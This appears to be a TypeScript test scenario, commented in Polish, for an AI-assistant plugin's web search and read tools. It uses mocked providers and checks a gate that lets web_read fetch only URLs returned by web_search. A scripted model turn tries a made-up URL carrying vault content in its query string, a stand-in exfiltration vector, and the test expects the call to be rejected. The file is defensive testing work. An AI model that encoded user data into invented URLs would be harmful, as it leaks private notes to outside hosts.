/**
 * 36_web_provenance — warstwa webowa END-TO-END na atrapach: 5 dostawców + bramka pochodzenia URL.
 *
 * PO CO: `modules/web` to drugi (obok streamingu modelu) kanał wyjścia pluginu na świat i do
 * Poligonu nie był ruszony ANI RAZU — bo jedzie `requestUrl`, którego harness domyślnie blokuje.
 * Router tras (`setHarnessRequestUrlRoutes`) to odblokował: żaden realny HTTP nie leci, a kod
 * produkcyjny (`WebSearchProvider`, `urlRegistry`, `WebSearchTool`, `WebReadTool`) idzie tą samą
 * ścieżką co u usera.
 *
 * Scenariusz sprawdza DWIE rzeczy naraz:
 *
 *  1. **Bramka pochodzenia (E1.3 P6 / L13-11) na ŻYWYM łańcuchu.** `web_read` wykonuje wyłącznie
 *     adresy, które ktoś legalnie wprowadził do obiegu — tu: zwrócone przez `web_search` w tym
 *     samym runtime. Adres WYMYŚLONY przez model (wektor eksfiltracji: „przeczytaj
 *     https://obcy…/?q=<treść z vaulta>") odbija się fail-closed. Model w turze robi jedno i drugie:
 *     czyta URL z wyników, a potem sięga po obcy — pierwsze przechodzi, drugie NIE.
 *
 *  2. **Parsowanie odpowiedzi 5 dostawców.** Każdy oddaje wyniki w INNYM kształcie
 *     (`data[]` / `results[]` / `web.results[]` / `organic[]` z `link`+`snippet`), a każdy parser
 *     ma dodatkowo fallback pola treści (`content || description`, `content || snippet`).
 *     Sprawdzamy to BEZ pętli po pętli agenta: wołamy `executeWebSearch` wprost, przestawiając
 *     dostawcę w surowym worku ustawień. Inwariant per dostawca: `provider` = ten, o który
 *     prosiliśmy, i ZERO `fallback_from` (zejście na darmową podłogę Jiny oznaczałoby, że parser
 *     wybranego dostawcy padł, a wynik i tak wyglądałby „poprawnie").
 *
 * ⚠️ Rejestr znanych URL-i (`urlRegistry`) jest singletonem na cały proces i NIE ma publicznego
 * czyszczenia — dlatego każdy dostawca dostaje WŁASNE, unikalne adresy, a asercje nigdy nie
 * zakładają, że rejestr jest pusty. Adresy są celowo w domenach-atrapach (`*.harness`,
 * `example.com`), żeby żadna literówka w routerze nie mogła trafić w prawdziwy serwis.
 *
 * ⚠️ Treść strony z czytnika jest KRÓTKA (poniżej `readTrimLimit`), więc `web_read` nie odpala
 * streszczania tanim modelem — `summarized:false`, `citations:[]`. To świadome: streszczanie
 * poszłoby do fake-serwera SSE i rozjechałoby numerację tur skryptu. Ścieżkę streszczania
 * pokrywają testy jednostkowe `WebReadTool.test.ts`.
 */
import { textTurn, toolCallTurn, lastToolResults } from '../mock/fake-llm-server.js';
import { setHarnessRequestUrlRoutes } from '../mock/obsidian.js';
import { executeWebSearch, isUrlKnown } from '../../modules/web/index.js';
import { assert, assertFinalText, assertToolErrored, assertToolOk, toolPosts } from './_asserts.js';

import type { FixturePayload, Scenario } from './_asserts.js';

// ── Adresy-atrapy (unikalne per dostawca — patrz nota o singletonie w nagłówku) ──
const URL_JINA_A = 'https://przyklad.harness/jina/atrapy';
const URL_JINA_B = 'https://przyklad.harness/jina/druga';
const URL_TAVILY = 'https://przyklad.harness/tavily/wynik';
const URL_BRAVE = 'https://przyklad.harness/brave/wynik';
const URL_SERPER = 'https://przyklad.harness/serper/wynik';
const URL_SEARXNG = 'https://przyklad.harness/searxng/wynik';
/** Adres, którego NIKT nie zwrócił — model go „wymyśla" (wektor eksfiltracji). */
const URL_OBCY = 'https://obcy.example.com/nieznany?q=tresc-z-vaulta';

const SEARXNG_INSTANCE = 'https://searx.harness.invalid';

const ZAPYTANIE = 'atrapy sieci w harnessie';
const ZNACZNIK_TRESCI = 'PELNA-TRESC-Z-CZYTNIKA';
const TYTUL_A = 'Atrapy sieci';
const TYTUL_CZYTNIKA = 'Atrapy sieci — cala strona';
const ODPOWIEDZ = 'Przeczytalem strone z wynikow; obcy adres sie nie otworzyl.';

/** Ile wiadomości `tool` jest w transkrypcie żądania = który krok tury odgrywamy (wzór z 32). */
function ileWynikowNarzedzi(request: FixturePayload): number {
  const messages = Array.isArray(request?.messages) ? request.messages : [];
  return messages.filter((m: FixturePayload) => m?.role === 'tool').length;
}

/** Wszystkie wywołania danego narzędzia w kolejności (`toolResult` daje tylko OSTATNIE). */
function wywolania(result: FixturePayload, nazwa: string): FixturePayload[] {
  const details = Array.isArray(result?.toolCallDetails) ? result.toolCallDetails : [];
  return details.filter((d: FixturePayload) => d.name === nazwa);
}

export default ({
  file: '36_web_provenance',
  name: 'web provenance',
  opis: 'web_search na atrapach 5 dostawców + web_read: adres z wyników przechodzi, adres wymyślony przez model odbija się o bramkę pochodzenia',
  agent: 'Tester',
  autonomy: 'edge',
  approve: 'auto',
  maxIterations: 5,
  liveSkip: 'dostawcy web wymagają realnych kluczy i sieci — bieg żywy w Fazie 2 osobnym promptem',

  /**
   * Trasy routera `requestUrl` (zero realnego HTTP) + konfiguracja Web Search.
   *
   * Ustawienia idą do SUROWEGO worka (`settingsStore.raw`), a nie przez obserwujące
   * proxy `env.settings` — mutacja przez proxy zaplanowałaby zapis ustawień na dysk, czyli
   * scenariusz zostawiałby po sobie ślad w temp-vaulcie bez powodu (wzór z 26/27).
   */
  async setup({ plugin }) {
    setHarnessRequestUrlRoutes([
      {
        // Jina search: `{data:[{title,url,content|description}]}` oddawane jako TEKST z JSON-em
        // (parser robi `JSON.parse(response.text)`). Drugi wynik niesie `description` zamiast
        // `content` — to jest ten fallback pola treści.
        match: 's.jina.ai',
        handler: () => ({
          json: {
            data: [
              { title: TYTUL_A, url: URL_JINA_A, content: 'Krotki fragment o atrapach.' },
              { title: 'Druga atrapa', url: URL_JINA_B, description: 'Fragment z pola description.' },
            ],
          },
        }),
      },
      {
        // Czytnik Jiny (`r.jina.ai`) — ZAWSZE on, niezależnie od wybranego dostawcy wyszukiwania.
        match: 'r.jina.ai',
        handler: (req) => ({
          json: {
            data: {
              url: req.url.replace('https://r.jina.ai/', ''),
              title: TYTUL_CZYTNIKA,
              content: `${ZNACZNIK_TRESCI} — tresc strony zwrocona przez czytnik atrapy.`,
            },
          },
        }),
      },
      {
        match: 'api.tavily.com/search',
        handler: () => ({ json: { results: [{ title: 'Tavily atrapa', url: URL_TAVILY, content: 'Tresc od Tavily.' }] } }),
      },
      {
        match: 'api.search.brave.com',
        handler: () => ({ json: { web: { results: [{ title: 'Brave atrapa', url: URL_BRAVE, description: 'Tresc od Brave.' }] } } }),
      },
      {
        match: 'google.serper.dev/search',
        handler: () => ({ json: { organic: [{ title: 'Serper atrapa', link: URL_SERPER, snippet: 'Tresc od Serpera.' }] } }),
      },
      {
        // SearXNG jako jedyny ma KONFIGUROWALNY host (instancja usera) — trasa celuje w niego.
        match: 'searx.harness.invalid',
        handler: () => ({ json: { results: [{ title: 'SearXNG atrapa', url: URL_SEARXNG, snippet: 'Tresc od SearXNG.' }] } }),
      },
    ]);

    const worek = plugin?.env?.settingsStore.raw as FixturePayload;
    if (!worek) throw new Error('Brak settingsStore.raw — bootstrap środowiska nieukończony?');
    worek.pkmAssistant = worek.pkmAssistant || {};
    worek.pkmAssistant.webSearch = {
      enabled: true,
      provider: 'jina',
      apiKeys: {
        jina: 'harness-fake-jina',
        tavily: 'harness-fake-tavily',
        brave: 'harness-fake-brave',
        serper: 'harness-fake-serper',
      },
      instanceUrl: SEARXNG_INSTANCE,
      trimLimit: 120,
      readTrimLimit: 8000,
    };
  },

  /**
   * Tura DYNAMICZNA: adres do `web_read` musi przyjść z WYNIKU `web_search` (tak jak u żywego
   * modelu), a nie ze stałej — inaczej scenariusz sprawdzałby rejestr, do którego sam wpisał dane.
   */
  offlineScript: (ctx: FixturePayload) => {
    const krok = ileWynikowNarzedzi(ctx.request);

    if (krok === 0) return toolCallTurn('web_search', { query: ZAPYTANIE, limit: 3 });

    if (krok === 1) {
      const wyniki = lastToolResults(ctx.request).join('\n');
      const match = /"url"\s*:\s*"([^"]+)"/.exec(wyniki);
      if (!match) return textTurn('Nie udalo sie odczytac zadnego URL z wynikow web_search.');
      return toolCallTurn('web_read', { url: match[1] });
    }

    // Krok 3: adres SPOZA wyników — musi się odbić o bramkę pochodzenia.
    if (krok === 2) return toolCallTurn('web_read', { url: URL_OBCY });

    return textTurn(ODPOWIEDZ);
  },

  async asserts({ result, trace }) {
    // ── 1. web_search: wyniki z atrapy, w kształcie narzędzia (title/url/fragment) ──
    const szukanie = assertToolOk(result, 'web_search');
    const podgladSzukania = szukanie.resultPreview || '';
    assert(
      podgladSzukania.includes(URL_JINA_A) && podgladSzukania.includes(TYTUL_A),
      `web_search nie oddał wyniku z atrapy Jiny (URL/tytuł). Podgląd: ${podgladSzukania.slice(0, 300)}`,
    );
    assert(
      podgladSzukania.includes('"provider":"jina"'),
      `web_search nie zaraportował dostawcy jina (zeszło na podłogę?). Podgląd: ${podgladSzukania.slice(0, 300)}`,
    );

    // ── 2. Rejestr pochodzenia: wyniki ZNANE, adres wymyślony NIE ──
    // Import singletona wprost — scenariusze i plugin są w JEDNYM bundlu, więc to ten sam rejestr,
    // do którego pisał `WebSearchTool` w biegu.
    assert(isUrlKnown(URL_JINA_A), `URL z wyników web_search NIE trafił do rejestru pochodzenia: ${URL_JINA_A}`);
    assert(isUrlKnown(URL_JINA_B), `Drugi URL z wyników NIE trafił do rejestru pochodzenia: ${URL_JINA_B}`);
    assert(
      !isUrlKnown(URL_OBCY),
      `Adres WYMYŚLONY przez model trafił do rejestru pochodzenia (${URL_OBCY}) — bramka byłaby otwarta na eksfiltrację.`,
    );

    // ── 3. web_read: pierwszy (znany) przechodzi, drugi (obcy) odbija się ──
    const odczyty = wywolania(result, 'web_read');
    assert(odczyty.length === 2, `Oczekiwano DWÓCH wywołań web_read (znany + obcy), jest ${odczyty.length}.`);

    const znany = odczyty[0].resultPreview || '';
    assert(
      znany.includes(ZNACZNIK_TRESCI),
      `web_read na ZNANYM adresie nie oddał treści z atrapy czytnika. Podgląd: ${znany.slice(0, 300)}`,
    );
    assert(
      znany.includes(TYTUL_CZYTNIKA),
      `web_read zgubił tytuł strony z atrapy czytnika. Podgląd: ${znany.slice(0, 300)}`,
    );
    assert(
      znany.includes('"summarized":false'),
      `Krótka strona miała NIE iść do streszczania (tania ścieżka). Podgląd: ${znany.slice(0, 300)}`,
    );

    // `assertToolErrored` bierze OSTATNIE wywołanie — czyli dokładnie to na obcym adresie.
    assertToolErrored(result, 'web_read', /nieznanego pochodzenia|unknown provenance/i);
    assert(
      !isUrlKnown(URL_OBCY),
      'Nieudany web_read i tak wpisał obcy adres do rejestru — druga próba by przeszła.',
    );

    // ── 4. Licznik wywołań z trace (dowód, że nic się nie powtórzyło po cichu) ──
    const posty = toolPosts(trace);
    assert(
      posty.filter((p) => p.tool === 'web_search').length === 1,
      `Oczekiwano DOKŁADNIE jednego web_search, jest ${posty.filter((p) => p.tool === 'web_search').length}.`,
    );
    assert(
      posty.filter((p) => p.tool === 'web_read').length === 2,
      `Oczekiwano DOKŁADNIE dwóch web_read, jest ${posty.filter((p) => p.tool === 'web_read').length}.`,
    );

    // ── 5. Pozostali 4 dostawcy — BEZ pętli agenta, wprost przez silnik ──
    // Każdy oddaje inny kształt JSON-a; parser ma z niego zrobić `{title, url, content}`.
    // `provider` musi być TYM, o który prosiliśmy, a `fallback_from` MUSI być puste —
    // inaczej wynik pochodzi z darmowej podłogi Jiny, a parser dostawcy po cichu padł.
    const bazaKluczy = {
      jina: 'harness-fake-jina',
      tavily: 'harness-fake-tavily',
      brave: 'harness-fake-brave',
      serper: 'harness-fake-serper',
    };
    const dostawcy: Array<{ id: string; url: string; tytul: string; tresc: string }> = [
      { id: 'tavily', url: URL_TAVILY, tytul: 'Tavily atrapa', tresc: 'Tresc od Tavily.' },
      { id: 'brave', url: URL_BRAVE, tytul: 'Brave atrapa', tresc: 'Tresc od Brave.' },
      { id: 'serper', url: URL_SERPER, tytul: 'Serper atrapa', tresc: 'Tresc od Serpera.' },
      { id: 'searxng', url: URL_SEARXNG, tytul: 'SearXNG atrapa', tresc: 'Tresc od SearXNG.' },
    ];

    for (const d of dostawcy) {
      const odpowiedz = await executeWebSearch(
        // Osobne zapytanie per dostawca — cache wyszukiwania kluczuje po (dostawca, limit, fraza).
        `atrapa dostawcy ${d.id}`,
        { provider: d.id, apiKeys: bazaKluczy, instanceUrl: SEARXNG_INSTANCE },
        3,
      );
      assert(
        odpowiedz.provider === d.id && !odpowiedz.fallback_from,
        `Dostawca „${d.id}" nie obsłużył zapytania sam (provider=${odpowiedz.provider}, fallback_from=${odpowiedz.fallback_from ?? '-'}) `
        + '— parser jego formatu padł i wynik przyszedł z podłogi Jiny.',
      );
      assert(
        odpowiedz.results.length === 1,
        `Dostawca „${d.id}" miał oddać 1 sparsowany wynik, oddał ${odpowiedz.results.length}.`,
      );
      const wynik = odpowiedz.results[0];
      assert(wynik.url === d.url, `Dostawca „${d.id}": zły URL po parsowaniu — ${wynik.url}`);
      assert(wynik.title === d.tytul, `Dostawca „${d.id}": zły tytuł po parsowaniu — ${wynik.title}`);
      assert(
        wynik.content === d.tresc,
        `Dostawca „${d.id}": treść nie przeszła przez parser (fallback pola?) — ${JSON.stringify(wynik.content)}`,
      );
    }

    // ── 6. Pętla domknęła się odpowiedzią ──
    const finalText = assertFinalText(result);
    assert(
      finalText.includes(ODPOWIEDZ),
      `Finalny tekst pętli jest inny niż zaskryptowany: ${JSON.stringify(finalText.slice(0, 200))}`,
    );
  },
} satisfies Scenario);
